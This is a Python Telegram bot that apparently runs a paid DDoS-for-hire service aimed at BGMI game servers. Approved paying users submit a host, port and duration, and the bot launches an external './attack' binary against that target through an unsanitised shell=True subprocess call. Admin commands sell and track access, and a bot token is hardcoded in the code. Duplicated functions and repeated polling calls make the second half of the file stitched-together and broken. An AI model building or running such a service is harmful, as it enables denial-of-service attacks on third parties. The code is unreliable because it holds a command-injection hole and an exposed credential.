import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import os
from dateutil.relativedelta import relativedelta
import subprocess
import time
import random
import string

# Replace with your bot token and owner ID
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
YOUR_OWNER_ID = 6060545769  # Replace with your actual owner ID

bot = telebot.TeleBot('7470746259:AAHG_DBI3rNhFgsii-MIBp0_nmPKMppFjaI')

# Paths to data files
USERS_FILE = 'users.txt'
BALANCE_FILE = 'balance.txt'
ADMINS_FILE = 'admins.txt'
ATTACK_LOGS_FILE = 'log.txt'

# Database simulation
admins = set()
authorized_users = {}
user_balances = {}
bgmi_cooldown = {}
attack_method = "BGMI-VIP"  # Default method

# Load data from files
def load_data():
    global authorized_users, user_balances, admins
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                try:
                    username, user_id, expiry_date = line.strip().split(', ')
                    authorized_users[int(user_id)] = {'username': username, 'expiry': datetime.fromisoformat(expiry_date)}
                except ValueError:
                    print(f"Skipping malformed line in {USERS_FILE}: {line}")
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            for line in f:
                try:
                    username, user_id, balance = line.strip().split(', ')
                    user_balances[int(user_id)] = {'username': username, 'balance': int(balance)}
                except ValueError:
                    print(f"Skipping malformed line in {BALANCE_FILE}: {line}")
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r') as f:
            admins.update(int(line.strip()) for line in f)


# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read admin IDs from the file
def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []



# Save data to files
def save_users():
    with open(USERS_FILE, 'w') as f:
        for user_id, info in authorized_users.items():
            f.write(f"{info['username']}, {user_id}, {info['expiry'].isoformat()}\n")

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        for user_id, info in user_balances.items():
            f.write(f"{info['username']}, {user_id}, {info['balance']}\n")

def save_admins():
    with open(ADMINS_FILE, 'w') as f:
        for admin_id in admins:
            f.write(f"{admin_id}\n")

# Function to send a message when attack finishes
def attack_finished_reply(message, target, port, time):
    reply_message = (f"🚀 Attack finished Successfully! 🚀\n\n"
                     f"🗿Target: {target}:{port}\n"
                     f"🕦Attack Duration: {time}\n"
                     f"🔥Status: Attack is finished 🔥")
    bot.send_message(message.chat.id, reply_message)

# Function to handle the main menu
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton('🚀 Attack')
    markup.row(btn_attack)
    btn_reseller = telebot.types.KeyboardButton('💼 ResellerShip')
    btn_info = telebot.types.KeyboardButton('ℹ️ My Info')
    markup.row(btn_reseller, btn_info)
    bot.send_message(message.chat.id, "Welcome to the attack bot!", reply_markup=markup)

# Function to handle attack button press
@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def attack_info(message):
    user_id = message.chat.id
    if user_id in authorized_users:
        bot.send_message(message.chat.id, "Please provide the details for the attack in the following format:\n /attack <host> <port> <time>")
        bot.register_next_step_handler(message, process_attack_details)
    else:
        response = """🚫 Unauthorized Access! 🚫

Oops! It seems like you don't have permission to use the attack command. To gain access and unleash the power of attacks, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
        bot.send_message(message.chat.id, response)

# Function to handle resellership button press
@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def resellership_info(message):
    bot.send_message(message.chat.id, "Contact @EXTREMERESELLINGBOT_bot for reseller ship.")
# Function to handle "ℹ️ My Info" button press
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    user_id = message.from_user.id
    user_id_str = str(user_id)  # Convert user ID to string for better formatting

    role = "User"
    if user_id == YOUR_OWNER_ID:
        role = "🚀OWNER🚀"
    elif user_id in admins:
        role = "Admin"

    if user_id in authorized_users:
        user_info = authorized_users[user_id]
        username = user_info['username']
        expiry_date = user_info['expiry']
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id_str}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: {expiry_date}")
    else:
        # Fetch username if available, otherwise set as 'Not Available'
        username = message.from_user.username if message.from_user.username else "Not Available"
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: {user_id_str}\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: Not Applicable")
    bot.send_message(message.chat.id, response)

# Function to approve a user
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id in admins or message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and duration (e.g., 'user_id duration').")
        bot.register_next_step_handler(msg, process_approve_user)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_approve_user(message):
    try:
        user_id_text, duration_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        duration = parse_duration(duration_text)
        new_expiry = datetime.now() + duration

        cost = calculate_approval_cost(duration_text)
        if message.from_user.id == YOUR_OWNER_ID or (user_id in user_balances and user_balances[user_id]['balance'] >= cost):
            if message.from_user.id != YOUR_OWNER_ID:
                user_balances[user_id]['balance'] -= cost
            if user_id in authorized_users:
                authorized_users[user_id]['expiry'] = new_expiry
            else:
                username = bot.get_chat(user_id).username if bot.get_chat(user_id).username else "Unknown"
                authorized_users[user_id] = {'username': username, 'expiry': new_expiry}

            save_users()
            save_balances()

            username = authorized_users[user_id]['username']
            bot.send_message(message.chat.id, f"User @{username} (ID: {user_id}) approved for {duration_text}.")
        else:
            bot.send_message(message.chat.id, "❌ Approval failed! ❌")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {e}")
# Function to parse duration from text (continued)
def parse_duration(duration_text):
    amount = int(duration_text[:-1])
    unit = duration_text[-1]
    if unit == 'd':
        return timedelta(days=amount)
    elif unit == 'm':
        return relativedelta(months=amount)
    else:
        raise ValueError("Invalid duration format")

# Function to calculate approval cost based on duration
def calculate_approval_cost(duration_text):
    amount = int(duration_text[:-1])
    unit = duration_text[-1]
    if unit == 'd':
        return amount * 10  # Example: 10 units per day
    elif unit == 'm':
        return amount * 200  # Example: 200 units per month
    else:
        raise ValueError("Invalid duration format")


# Function to remove approval from a user
@bot.message_handler(commands=['removeapproval'])
def remove_approval(message):
    if message.from_user.id in admins or message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to remove approval.")
        bot.register_next_step_handler(msg, process_remove_approval)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_approval(message):
    try:
        user_id = int(message.text.strip())
        if user_id in authorized_users:
            del authorized_users[user_id]
            save_users()
            bot.send_message(message.chat.id, f"Approval removed for user ID: {user_id}.")
        else:
            bot.send_message(message.chat.id, "User ID not found in the approval list.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please try again.")

# Function to handle the leaderboard command
@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    if not user_balances:
        bot.send_message(message.chat.id, "No users found in the leaderboard.")
        return

    sorted_users = sorted(user_balances.items(), key=lambda x: x[1]['balance'], reverse=True)
    leaderboard_text = "🏆 Leaderboard 🏆\n\n"
    for i, (user_id, info) in enumerate(sorted_users, start=1):
        leaderboard_text += f"{i}. @{info['username']} - {info['balance']} units\n"

    bot.send_message(message.chat.id, leaderboard_text)

# Load data at startup
load_data()

        
# Function to add an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and initial balance for the new admin (e.g., 'user_id balance').")
        bot.register_next_step_handler(msg, process_add_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_admin(message):
    try:
        user_id_text, balance_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        balance = int(balance_text.strip())

        admins.add(user_id)
        user_balances[user_id] = {'username': "Unknown", 'balance': balance}
        save_admins()
        save_balances()

        bot.send_message(message.chat.id, f"User ID {user_id} added as an admin with a balance of {balance}.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id balance' (e.g., '123456789 1000').")

# Function to remove an admin
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID to remove from admins.")
        bot.register_next_step_handler(msg, process_remove_admin)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_admin(message):
    try:
        user_id = int(message.text.strip())
        if user_id in admins:
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"User ID {user_id} has been removed from admins.")
        else:
            bot.send_message(message.chat.id, f"User ID {user_id} is not an admin.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid user ID format. Please try again with a valid user ID.")

# Function to add balance to a user's account
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if message.from_user.id in admins or message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to add (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_add_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_add_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances:
            user_balances[user_id]['balance'] += amount
        else:
            username = "Unknown"  # You might want to prompt the admin to enter the username
            user_balances[user_id] = {'username': username, 'balance': amount}

        save_balances()

        username = user_balances[user_id]['username']
        bot.send_message(message.chat.id, f"Added {amount} balance to @{username} (ID: {user_id}).")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

# Function to remove balance from a user's account
@bot.message_handler(commands=['removebalance'])
def remove_balance(message):
    if message.from_user.id in admins or message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "Please specify the user ID and the amount to remove (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_remove_balance)
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")

def process_remove_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances and user_balances[user_id]['balance'] >= amount:
            user_balances[user_id]['balance'] -= amount
            save_balances()
            username = user_balances[user_id]['username']
            bot.send_message(message.chat.id, f"Removed {amount} balance from @{username} (ID: {user_id}).")
        else:
            bot.send_message(message.chat.id, "Invalid user ID or insufficient balance.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")
# Function to handle the /allusers command
@bot.message_handler(commands=['allusers'])
def all_users(message):
    if message.from_user.id in admins or message.from_user.id == YOUR_OWNER_ID:
        if authorized_users:
            response = "📋 List of all authorized users:\n\n"
            for user_id, info in authorized_users.items():
                response += f"🆔 User ID: `{user_id}`\n"
                response += f"👤 Username: @{info['username']}\n"
                response += f"⏳ Approval Expiry: {info['expiry']}\n\n"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "No authorized users found.")
    else:
        bot.send_message(message.chat.id, "You don't have permission to use this command.")


# Function to check the balance of a user
@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)
# Function to initiate an attack
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        if user_id not in admins and user_id != YOUR_OWNER_ID:
            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                remaining_time = 3 - (datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"You must wait {remaining_time:.2f} seconds before initiating another attack."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.now()

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_duration = int(command[3])
            if time_duration > 300:
                response = "Error: Time interval must be less than 300."
                bot.reply_to(message, response)
            else:
                record_command_logs(user_id, '/attack', target, port, time_duration)
                log_command(user_id, target, port, time_duration)
                msg = start_attack_reply(message, target, port, time_duration)
                full_command = f"./attack {target} {port} {time_duration} 200 --method {attack_method}"
                subprocess.run(full_command, shell=True)
                attack_finished_reply(message, target, port, time_duration)
        else:
            response = "To use the attack command, type it in the following format:\n\n /attack <host> <port> <time>"
            bot.reply_to(message, response)
    else:
        response = """🚫 Unauthorized Access! 🚫Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
        bot.reply_to(message, response)

# Function to record command logs
def record_command_logs(user_id, command, target, port, time_duration):
    with open(ATTACK_LOGS_FILE, 'a') as f:
        log_entry = f"{datetime.now().isoformat()}, {user_id}, {command}, {target}, {port}, {time_duration}\n"
        f.write(log_entry)

# Function to log commands
def log_command(user_id, target, port, time_duration):
    # Placeholder for logging functionality
    pass

# Function to check if a user is authorized
def is_authorized(user_id):
    return user_id in authorized_users and authorized_users[user_id]['expiry'] > datetime.now()

# Function to check if a user is an admin
def is_admin(user_id):
    return user_id in admins or user_id == YOUR_OWNER_ID

# Start polling
bot.infinity_polling()



# Function to check if a user is an admin
def is_admin(user_id):
    return user_id in admins or user_id == YOUR_OWNER_ID

# Start polling
bot.infinity_polling()



# Function to record command logs
def record_command_logs(user_id, command, target, port, time_duration):
    with open(ATTACK_LOGS_FILE, 'a') as f:
        log_entry = f"{datetime.now().isoformat()}, {user_id}, {command}, {target}, {port}, {time_duration}\n"
        f.write(log_entry)

# Function to log commands
def log_command(user_id, target, port, time_duration):
    # Placeholder for logging functionality
    pass

# Function to check if a user is authorized
def is_authorized(user_id):
    return user_id in authorized_users and authorized_users[user_id]['expiry'] > datetime.now()

# Function to check if a user is an admin
def is_admin(user_id):
    return user_id in admins or user_id == YOUR_OWNER_ID

# Start polling
bot.infinity_polling()


# Function to check if a user is authorized
def is_authorized(user_id):
    return user_id in authorized_users and authorized_users[user_id]['expiry'] > datetime.now()

# Function to check if a user is an admin
def is_admin(user_id):
    return user_id in admins or user_id == YOUR_OWNER_ID

# Start polling
bot.infinity_polling()


# Function to check if a user is an admin
def is_admin(user_id):
    return user_id in admins or user_id == YOUR_OWNER_ID

# Start polling
bot.infinity_polling()


# Start polling
bot.infinity_polling()